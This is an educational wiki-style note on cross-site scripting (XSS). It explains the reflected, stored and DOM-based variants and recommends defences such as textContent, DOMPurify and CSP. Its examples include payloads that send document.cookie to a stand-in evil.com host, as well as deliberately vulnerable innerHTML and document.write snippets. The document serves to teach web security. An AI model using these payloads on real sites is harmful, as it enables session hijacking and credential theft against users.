---
title: XSS (Cross-Site Scripting)
created: 2026-04-13
updated: 2026-04-13
type: concept
tags: [xss, security, web, vulnerability, injection, http]
---

# XSS (Cross-Site Scripting)

## Overview

Cross-Site Scripting (XSS) is a code injection attack where an attacker embeds malicious JavaScript into a web page that is then executed in the victim's browser. Unlike attacks that target server infrastructure, XSS exploits the trust a user's browser places in a seemingly legitimate page. Successful XSS attacks can steal session cookies, deface websites, redirect users to malicious domains, or install keyloggers—all without the victim noticing until damage is done.

XSS is consistently ranked among the OWASP Top 10 web vulnerabilities and remains one of the most prevalent security issues on the internet. It affects any application that renders user input without proper sanitization, including forums, comment sections, search boxes, and profile fields.

## Key Concepts

- **Attack vector**: User-supplied data (URL parameters, form inputs, HTTP headers) is included in a page's output without validation or encoding.
- **JavaScript execution context**: The injected script runs in the security origin of the vulnerable page, giving it access to cookies, localStorage, DOM, and network requests.
- **Reflected vs. Stored**: Reflected XSS executes immediately from a crafted URL; Stored (persistent) XSS is saved on the server and served to all users who view the affected page.
- **DOM-based XSS**: The vulnerability exists entirely client-side—the malicious payload never reaches the server, making traditional server-side filters ineffective.
- **Content Security Policy (CSP)**: A defense header that restricts what scripts can execute on a page, mitigating but not eliminating XSS risk.

## How It Works

The core problem is mixing data and code. When an application concatenates user input into HTML, JavaScript, or URL contexts without escaping, an attacker can break out of the intended data context and into a code context.

```javascript
// Vulnerable:直接将用户输入插入HTML
const name = req.query.name; // attacker-controlled
document.getElementById('greeting').innerHTML = `Hello, ${name}!`;

// Attack payload in the 'name' parameter:
// <img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">
```

When this HTML is inserted into the page, the `<img>` tag fails to load, triggering `onerror`—arbitrary JavaScript execution.

```html
<!-- What the vulnerable page renders -->
<div id="greeting">Hello, <img src=x onerror="stealCookie()">!</div>

<!-- Browser parses and executes the injected onerror handler -->
```

## Practical Applications

- **Session hijacking**: Stealing `document.cookie` to impersonate a logged-in user
- **Credential theft**: Overlaying fake login forms to phish credentials
- **Keylogging**: Injecting a script that captures all keystrokes on the page
- **Website defacement**: Modifying page content to display attacker-controlled information
- **Worm propagation**: Self-replicating XSS that spreads through social network shares

## Examples

### Reflected XSS in a Search Field

```http
GET /search?q=<script>alert('XSS')</script> HTTP/1.1
Host: example.com

<!-- Server echoes the query parameter unsanitized -->
<p>Results for: <script>alert('XSS')</script></p>
```

### Stored XSS in a Comment System

```html
<!-- Attacker posts this as a comment -->
<script>
  fetch('https://evil.com', {
    method: 'POST',
    body: JSON.stringify({ cookie: document.cookie })
  });
</script>

<!-- Every user viewing the comment executes the script -->
```

### DOM-Based XSS

```javascript
// Vulnerable JavaScript reads from URL and writes to page
const params = new URLSearchParams(window.location.search);
const lang = params.get('lang');
document.write(`<p>Language: ${lang}</p>`);

// Attacker URL: https://site.com/?lang=<svg onload=alert(1)>
```

### Preventative Code

```javascript
// Safe: Use textContent instead of innerHTML
element.textContent = userInput;

// Safe: DOMPurify sanitization
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);

// Safe: Template engines auto-escape by default
// In React: dangerouslySetInnerHTML only when absolutely necessary
```

## Related Concepts

- [[http]] — The protocol over which XSS attacks are delivered
- [[authentication]] — Session cookies targeted by XSS theft
- [[web-api]] — Backend endpoints that may reflect attacker input
- [[cryptography]] — Secure cookie flags (HttpOnly, Secure) that protect against XSS cookie theft
- [[authentication]] — CSRF tokens as a complementary defense

## Further Reading

- OWASP XSS Prevention Cheat Sheet
- PortSwigger Web Security Academy: XSS
- "The Tangled Web" by Michal Zalewski — foundational web security text

## Personal Notes

The single most effective habit to prevent XSS: never use `innerHTML` with user data. Use `textContent` for plain text, and a vetted sanitization library (DOMPurify) when HTML is genuinely needed. Also enable CSP headers—it's a strong second line of defense that limits what inline scripts can do even if XSS slips through. CSP reporting can also alert you to attempted exploitation.
